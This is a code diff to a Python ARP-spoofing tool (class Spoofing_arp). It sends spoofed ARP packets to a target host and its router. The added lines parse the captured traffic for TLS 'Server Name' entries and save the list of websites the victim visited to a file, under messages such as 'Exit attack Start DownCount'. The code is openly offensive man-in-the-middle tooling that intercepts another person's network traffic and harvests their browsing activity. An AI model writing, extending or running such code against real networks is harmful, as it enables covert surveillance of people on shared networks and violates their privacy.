@@ -170,8 +170,7 @@ class Spoofing_arp:
                     Packet_target = eth_hdr_Fix +arp_target 
                     Packet_router = eth_hdr2_Fix +arp_router
                     send_packet_to_Target   = SocketConnect.send(Packet_target)    
-                    send_packet_to_router   = SocketConnect.send(Packet_router) 
-                                          
+                    send_packet_to_router   = SocketConnect.send(Packet_router)    
                     print("\rHosueKeeping Cleanup Process ......")
                     print("*"*40)
                     time.sleep(0.30)
@@ -200,6 +199,21 @@ class Spoofing_arp:
                             time.sleep(1)
                             print("[*] PCAPNG Packet Capture saved at  Capture folder ...")
                     counted = 6 
+                    if os.path.exists("./capture/"+self.args.Target+"/roaming.txt"):
+                       os.remove("./capture/"+self.args.Target+"/roaming.txt")
+                    with open("./capture/"+self.args.Target+"/"+self.args.Target+".txt",'r') as  output :
+                          read_file = output.readlines()
+                    list =[]
+                    for line in read_file :
+                        if "Server Name:" in line  :
+                            list.append(line)
+                            list_all=set(list)
+                    roming = str("".join(list_all)).replace("Server Name:",'').replace("                     ","[+] ")
+                    with open("./capture/"+self.args.Target+"/roaming.txt",'w') as ip_1:
+                         ip_1.write(roming )
+                    id_user =  os.stat("./capture/"+self.args.Target+"/"+self.args.Target+".txt").st_uid 
+                    os.chown("./capture/"+self.args.Target+"/roaming.txt", id_user, id_user)
+                    print("[*] Website Name Vaist Saved at ./capture/"+self.args.Target+"/roaming.txt ")
                     for i in range(int(counted)) :
                         counted -=1
                         print("[*] Exit attack Start DownCount >> "+str(counted))
